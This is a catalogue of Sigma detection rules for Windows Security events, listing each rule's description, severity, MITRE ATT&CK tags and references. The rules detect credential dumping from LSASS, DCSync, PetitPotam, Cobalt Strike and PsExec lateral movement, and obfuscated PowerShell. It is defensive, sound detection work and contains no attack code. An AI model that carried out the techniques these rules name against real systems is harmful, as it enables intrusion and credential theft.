* https://github.com/Azure/Azure-Sentinel/blob/master/Detections/SecurityEvent/SecurityEventLogCleared.yaml

    
### Suspicious PsExec Execution
    
    detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_psexec.yml
* https://blog.menasec.net/2019/02/threat-hunting-3-detecting-psexec.html

    
### Successful Overpass the Hash Attempt
    
    Detects successful logon with logon type 9 (NewCredentials) which matches the Overpass the Hash behavior of e.g Mimikatz's sekurlsa::pth module.

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.s0002
    * MITRE: attack.t1550.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_overpass_the_hash.yml
* https://cyberwardog.blogspot.de/2017/04/chronicles-of-threat-hunter-hunting-for.html

    
### Valid Users Failing to Authenticate From Single Source Using Kerberos
    
    Detects multiple failed logins with multiple valid domain accounts from a single source system using the Kerberos protocol.

    * Level: medium
    * MITRE: attack.t1110.003
    * MITRE: attack.initial_access
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logons_single_source_kerberos.yml
* https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying

    
### Invoke-Obfuscation Via Stdin
    
    Detects Obfuscated Powershell via Stdin in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_via_stdin_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Invoke-Obfuscation Via Use Rundll32
    
    Detects Obfuscated Powershell via use Rundll32 in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_via_use_rundll32_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### DPAPI Domain Master Key Backup Attempt
    
    Detects anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_dpapi_domain_masterkey_backup_attempt.yml
* https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html

    
### Sysmon Channel Reference Deletion
    
    Potential threat actor tampering with Sysmon manifest and eventually disabling it

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_sysmon_channel_reference_deletion.yml
* https://twitter.com/Flangvik/status/1283054508084473861

* https://twitter.com/SecurityJosh/status/1283027365770276866

* https://securityjosh.github.io/2020/04/23/Mute-Sysmon.html

* https://gist.github.com/Cyb3rWard0g/cf08c38c61f7e46e8404b38201ca01c8

    
### Admin User Remote Logon
    
    Detect remote login by Administrator user (depending on internal pattern).

    * Level: low
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1078.001
    * MITRE: attack.t1078.002
    * MITRE: attack.t1078.003
    * MITRE: car.2016-04-005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_admin_rdp_login.yml
* https://car.mitre.org/wiki/CAR-2016-04-005

    
### Transferring Files with Credential Data via Network Shares
    
    Transferring files with well-known filenames (sensitive files with credential data) using network shares

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.001
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_transferring_files_with_credential_data_via_network_shares.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### Processes Accessing the Microphone and Webcam
    
    Potential adversaries accessing the microphone and webcam in an endpoint.

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1123
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_camera_microphone_access.yml
* https://twitter.com/duzvik/status/1269671601852813320

* https://medium.com/@7a616368/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072

    
### AD Privileged Users or Groups Reconnaissance
    
    Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1087.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_account_discovery.yml
* https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html

    
### Multiple Users Attempting To Authenticate Using Explicit Credentials
    
    Detects a source user failing to authenticate with multiple users using explicit credentials on a host.

    * Level: medium
    * MITRE: attack.t1110.003
    * MITRE: attack.initial_access
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logons_explicit_credentials.yml
* https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying

    
### ADCS Certificate Template Configuration Vulnerability
    
    Detects certificate creation with template allowing risk permission subject

    * Level: low
    * MITRE: attack.privilege_escalation
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_adcs_certificate_template_configuration_vulnerability.yml
* https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf

    
### CobaltStrike Service Installations
    
    Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.privilege_escalation
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.t1543.003
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_security_cobaltstrike_service_installs.yml
* https://www.sans.org/webcasts/119395

* https://www.crowdstrike.com/blog/getting-the-bacon-from-cobalt-strike-beacon/

* https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/

    
### Remote Service Activity via SVCCTL Named Pipe
    
    Detects remote service activity via remote access to the svcctl named pipe

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.persistence
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_svcctl_remote_service.yml
* https://blog.menasec.net/2019/03/threat-hunting-26-remote-windows.html

    
### Denied Access To Remote Desktop
    
    This event is generated when an authenticated user who is not allowed to log on remotely attempts to connect to this computer through Remote Desktop. Often, this event can be generated by attackers when searching for available windows servers in the network.

    * Level: medium
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_not_allowed_rdp_access.yml
* https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4825

    
### Mimikatz DC Sync
    
    Detects Mimikatz DC sync security events

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.s0002
    * MITRE: attack.t1003.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_dcsync.yml
* https://twitter.com/gentilkiwi/status/1003236624925413376

* https://gist.github.com/gentilkiwi/dcc132457408cf11ad2061340dcb53c2

* https://blog.blacklanternsecurity.com/p/detecting-dcsync?s=r

* https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4662

    
### Invoke-Obfuscation Obfuscated IEX Invocation
    
    Detects all variations of obfuscated powershell IEX invocation code generated by Invoke-Obfuscation framework from the code block linked in the references

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_obfuscated_iex_services_security.yml
* https://github.com/danielbohannon/Invoke-Obfuscation/blob/master/Out-ObfuscatedStringCommand.ps1#L873-L888

    
### Scheduled Task Deletion
    
    Detects scheduled task deletion events. Scheduled tasks are likely to be deleted if not used for persistence. Malicious Software often creates tasks directly under the root node e.g. \TASKNAME

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.privilege_escalation
    * MITRE: car.2013-08-001
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_scheduled_task_deletion.yml
* https://twitter.com/matthewdunwoody/status/1352356685982146562

* https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4699

    
### ADCS Certificate Template Configuration Vulnerability with Risky EKU
    
    Detects certificate creation with template allowing risk permission subject and risky EKU

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.credential_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_adcs_certificate_template_configuration_vulnerability_eku.yml
* https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf

    
### Password Change on Directory Service Restore Mode (DSRM) Account
    
    The Directory Service Restore Mode (DSRM) account is a local administrator account on Domain Controllers. Attackers may change the password to gain persistence.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_dsrm_password_change.yml
* https://adsecurity.org/?p=1714

    
### New or Renamed User Account with '$' in Attribute 'SamAccountName'
    
    Detects possible bypass EDR and SIEM via abnormal user account name.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_new_or_renamed_user_account_with_dollar_sign.yml
    
### WMI Persistence
    
    Detects suspicious WMI event filter and command line event consumer based on WMI and Security Logs.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1546.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_security_wmi_persistence.yml
* https://twitter.com/mattifestation/status/899646620148539397

* https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/

    
### Account Tampering - Suspicious Failed Logon Reasons
    
    This method uses uncommon error codes on failed logons to determine suspicious activity and tampering with accounts that have been disabled or somehow restricted.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.initial_access
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logon_reasons.yml
* https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625

* https://twitter.com/SBousseaden/status/1101431884540710913

    
### Possible PetitPotam Coerce Authentication Attempt
    
    Detect PetitPotam coerced authentication activity.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1187
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_petitpotam_network_share.yml
* https://github.com/topotam/PetitPotam

* https://github.com/splunk/security_content/blob/0dd6de32de2118b2818550df9e65255f4109a56d/detections/endpoint/petitpotam_network_share_access_request.yml

    
### COMPlus_ETWEnabled Registry Modification
    
    Potential adversaries stopping ETW providers recording loaded .NET assemblies.

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_etw_modification.yml
* https://twitter.com/_xpn_/status/1268712093928378368

* https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr

* https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables

* https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38

* https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39

* https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_

* https://bunnyinside.com/?term=f71e8cb9c76a

* http://managed670.rssing.com/chan-5590147/all_p1.html

* https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code

    
### PetitPotam Suspicious Kerberos TGT Request
    
    Detect suspicious Kerberos TGT requests. Once an attacer obtains a computer certificate by abusing Active Directory Certificate Services in combination with PetitPotam, the next step would be to leverage the certificate for malicious purposes. One way of doing this is to request a Kerberos Ticket Granting Ticket using a tool like Rubeus. This request will generate a 4768 event with some unusual fields depending on the environment. This analytic will require tuning, we recommend filtering Account_Name to the Domain Controller computer accounts.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1187
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_petitpotam_susp_tgt_request.yml
* https://github.com/topotam/PetitPotam

* https://isc.sans.edu/forums/diary/Active+Directory+Certificate+Services+ADCS+PKI+domain+admin+vulnerability/27668/

* https://github.com/splunk/security_content/blob/develop/detections/endpoint/petitpotam_suspicious_kerberos_tgt_request.yml

    
### Protected Storage Service Access
    
    Detects access to a protected_storage service over the network. Potential abuse of DPAPI to extract domain backup keys from Domain Controllers

    * Level: critical
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_protected_storage_service_access.yml
* https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html

    
### Active Directory Replication from Non Machine Account
    
    Detects potential abuse of Active Directory Replication Service (ADRS) from a non machine account to request credentials.

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.006
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_ad_replication_non_machine_account.yml
* https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-180815210510.html

    
### SCM Database Handle Failure
    
    Detects non-system users failing to get a handle of the SCM database.

    * Level: critical
    * MITRE: attack.discovery
    * MITRE: attack.t1010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_scm_database_handle_failure.yml
* https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190826010110.html

    
### Multiple Users Failing to Authenticate from Single Process
    
    Detects failed logins with multiple accounts from a single process on the system.

    * Level: medium
    * MITRE: attack.t1110.003
    * MITRE: attack.initial_access
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logons_single_process.yml
* https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying

* https://www.trimarcsecurity.com/single-post/2018/05/06/trimarc-research-detecting-password-spraying-with-security-event-auditing

    
### Rare Schtasks Creations
    
    Detects rare scheduled tasks creations that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious code

    * Level: low
    * MITRE: attack.execution
    * MITRE: attack.privilege_escalation
    * MITRE: attack.persistence
    * MITRE: car.2013-08-001
    * MITRE: attack.t1053.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_rare_schtasks_creations.yml
    
### Invoke-Obfuscation COMPRESS OBFUSCATION
    
    Detects Obfuscated Powershell via COMPRESS OBFUSCATION

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_via_compress_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### SysKey Registry Keys Access
    
    Detects handle requests and access operations to specific registry keys to calculate the SysKey

    * Level: critical
    * MITRE: attack.discovery
    * MITRE: attack.t1012
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_syskey_registry_access.yml
* https://threathunterplaybook.com/notebooks/windows/07_discovery/WIN-190625024610.html

    
### RottenPotato Like Attack Pattern
    
    Detects logon events that have characteristics of events generated during an attack with RottenPotato and the like

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.credential_access
    * MITRE: attack.t1557.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_rottenpotato.yml
* https://twitter.com/SBousseaden/status/1195284233729777665

    
### Generic Password Dumper Activity on LSASS
    
    Detects process handle on LSASS process with certain access mask

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: car.2019-04-004
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_lsass_dump_generic.yml
* https://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html

* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### Hacktool Ruler
    
    This events that are generated when using the hacktool Ruler by Sensepost

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.execution
    * MITRE: attack.t1087
    * MITRE: attack.t1114
    * MITRE: attack.t1059
    * MITRE: attack.t1550.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_alert_ruler.yml
* https://github.com/sensepost/ruler

* https://github.com/sensepost/ruler/issues/47

* https://github.com/staaldraad/go-ntlm/blob/master/ntlm/ntlmv1.go#L427

* https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776

* https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624

    
### Hidden Local User Creation
    
    Detects the creation of a local hidden user account which should not happen for event ID 4720.

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1136.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_hidden_user_creation.yml
* https://twitter.com/SBousseaden/status/1387743867663958021

    
### Active Directory User Backdoors
    
    Detects scenarios where one can control another users or computers account without having to use their credentials.

    * Level: high
    * MITRE: attack.t1098
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_alert_ad_user_backdoors.yml
* https://msdn.microsoft.com/en-us/library/cc220234.aspx

* https://adsecurity.org/?p=3466

* https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/

    
### Valid Users Failing to Authenticate from Single Source Using NTLM
    
    Detects failed logins with multiple valid domain accounts from a single source system using the NTLM protocol.

    * Level: medium
    * MITRE: attack.t1110.003
    * MITRE: attack.initial_access
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logons_single_source_ntlm.yml
* https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying

    
### External Disk Drive Or USB Storage Device
    
    Detects external diskdrives or plugged in USB devices , EventID 6416 on windows 10 or later

    * Level: low
    * MITRE: attack.t1091
    * MITRE: attack.t1200
    * MITRE: attack.lateral_movement
    * MITRE: attack.initial_access
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_external_device.yml
    
### Suspicious Kerberos RC4 Ticket Encryption
    
    Detects service ticket requests using RC4 encryption type

    * Level: medium
    * MITRE: attack.credential_access
    * MITRE: attack.t1558.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_rc4_kerberos.yml
* https://adsecurity.org/?p=3458

* https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity

    
### SMB Create Remote File Admin Share
    
    Look for non-system accounts SMB accessing a file with write (0x2) access mask via administrative share (i.e C$).

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_smb_file_creation_admin_shares.yml
* https://github.com/OTRF/ThreatHunter-Playbook/blob/master/playbooks/WIN-201012004336.yaml

* https://securitydatasets.com/notebooks/small/windows/08_lateral_movement/SDWIN-200806015757.html?highlight=create%20file

    
### Suspicious Remote Logon with Explicit Credentials
    
    Detects suspicious processes logging on with explicit credentials

    * Level: medium
    * MITRE: attack.t1078
    * MITRE: attack.lateral_movement
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_logon_explicit_credentials.yml
* https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view

    
### Addition of Domain Trusts
    
    Addition of domains is seldom and should be verified for legitimacy.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1098
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_add_domain_trust.yml
    
### Failed Logins with Different Accounts from Single Source System
    
    Detects suspicious failed logins with different user accounts from a single source system

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1078
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logons_single_source.yml
    
### Invoke-Obfuscation Via Use MSHTA
    
    Detects Obfuscated Powershell via use MSHTA in Scripts

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_via_use_mshta_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Password Dumper Activity on LSASS
    
    Detects process handle on LSASS process with certain access mask and object type SAM_DOMAIN

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_lsass_dump.yml
* https://twitter.com/jackcr/status/807385668833968128

    
### Windows Network Access Suspicious desktop.ini Action
    
    Detects unusual processes accessing desktop.ini remotely over network share, which can be leveraged to alter how Explorer displays a folder's content (i.e. renaming files) without changing them on disk.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.009
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_net_share_obj_susp_desktop_ini.yml
* https://isc.sans.edu/forums/diary/Desktopini+as+a+postexploitation+tool/25912/

    
### Metasploit Or Impacket Service Installation Via SMB PsExec
    
    Detects usage of Metasploit SMB PsExec (exploit/windows/smb/psexec) and Impacket psexec.py by triggering on specific service installation

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    * MITRE: attack.t1570
    * MITRE: attack.execution
    * MITRE: attack.t1569.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_security_metasploit_or_impacket_smb_psexec_service_install.yml
* https://bczyz1.github.io/2021/01/30/psexec.html

    
### Password Protected ZIP File Opened (Email Attachment)
    
    Detects the extraction of password protected ZIP archives. See the filename variable for more details on which file has been opened.

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_opened_encrypted_zip_outlook.yml
* https://twitter.com/sbousseaden/status/1523383197513379841

    
### First Time Seen Remote Named Pipe
    
    This detection excludes known namped pipes accessible remotely and notify on newly observed ones, may help to detect lateral movement and remote exec using named pipes

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_lm_namedpipe.yml
* https://twitter.com/menasec1/status/1104489274387451904

    
### Addition of SID History to Active Directory Object
    
    An attacker can use the SID history attribute to gain additional privileges.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1134.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_add_sid_history.yml
* https://adsecurity.org/?p=1772

    
### Password Protected ZIP File Opened (Suspicious Filenames)
    
    Detects the extraction of password protected ZIP archives with suspicious file names. See the filename variable for more details on which file has been opened.

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_opened_encrypted_zip_filename.yml
* https://twitter.com/sbousseaden/status/1523383197513379841

    
### Remote Registry Management Using Reg Utility
    
    Remote registry management using REG utility from non-admin workstation

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    * MITRE: attack.discovery
    * MITRE: attack.t1012
    * MITRE: attack.credential_access
    * MITRE: attack.t1552.002
    * MITRE: attack.s0075
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_remote_registry_management_using_reg_utility.yml
* https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment

    
### CVE-2021-1675 Print Spooler Exploitation IPC Access
    
    Detects remote printer driver load from Detailed File Share in Security logs that are a sign of successful exploitation attempts against print spooler vulnerability CVE-2021-1675 and CVE-2021-34527

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1569
    * MITRE: cve.2021.1675
    * MITRE: cve.2021.34527
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_exploit_cve_2021_1675_printspooler_security.yml
* https://twitter.com/INIT_3/status/1410662463641731075

    
### NetNTLM Downgrade Attack
    
    Detects NetNTLM downgrade attack

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_net_ntlm_downgrade.yml
* https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks

    
### LSASS Access from Non System Account
    
    Detects potential mimikatz-like tools accessing LSASS from non system account

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_lsass_access_non_system_account.yml
* https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-170105221010.html

    
### Operation Wocao Activity
    
    Detects activity mentioned in Operation Wocao report

    * Level: high
    * MITRE: attack.discovery
    * MITRE: attack.t1012
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1036.004
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1053.005
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_apt_wocao.yml
* https://www.fox-it.com/en/news/whitepapers/operation-wocao-shining-a-light-on-one-of-chinas-hidden-hacking-groups/

* https://twitter.com/SBousseaden/status/1207671369963646976

    
### Defrag Deactivation
    
    Detects the deactivation and disabling of the Scheduled defragmentation task as seen by Slingshot APT group

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1053
    * MITRE: attack.s0111
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_apt_slingshot.yml
* https://securelist.com/apt-slingshot/84312/

    
### Metasploit SMB Authentication
    
    Alerts on Metasploit host's authentications on the domain.

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: attack.t1021.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_metasploit_authentication.yml
* https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/proto/smb/client.rb

    
### Invalid Users Failing To Authenticate From Source Using Kerberos
    
    Detects failed logins with multiple invalid domain accounts from a single source system using the Kerberos protocol.

    * Level: medium
    * MITRE: attack.t1110.003
    * MITRE: attack.initial_access
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_logons_single_source_kerberos3.yml
* https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying

    
### Invoke-Obfuscation CLIP+ Launcher
    
    Detects Obfuscated use of Clip.exe to execute PowerShell

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1027
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_invoke_obfuscation_clip_services_security.yml
* https://github.com/Neo23x0/sigma/issues/1009

    
### Multiple Users Remotely Failing To Authenticate From Single Source
    
    Detects a source system failing to authenticate against a remote host with multiple users.

    * Level: medium
    * MITRE: attack.t1110.003
    * MITRE: attack.initial_access
    * MITRE: attack.privilege_escalation
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_failed_remote_logons_single_source.yml
* https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying

    
### Suspicious Access to Sensitive File Extensions
    
    Detects known sensitive file extensions accessed on a network share

    * Level: medium
    * MITRE: attack.collection
    * MITRE: attack.t1039
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_susp_raccess_sensitive_fext.yml
    
### RDP Login from Localhost
    
    RDP login with localhost source address may be a tunnelled login

    * Level: high
    * MITRE: attack.lateral_movement
    * MITRE: car.2013-07-002
    * MITRE: attack.t1021.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/builtin/security/win_rdp_localhost_login.yml
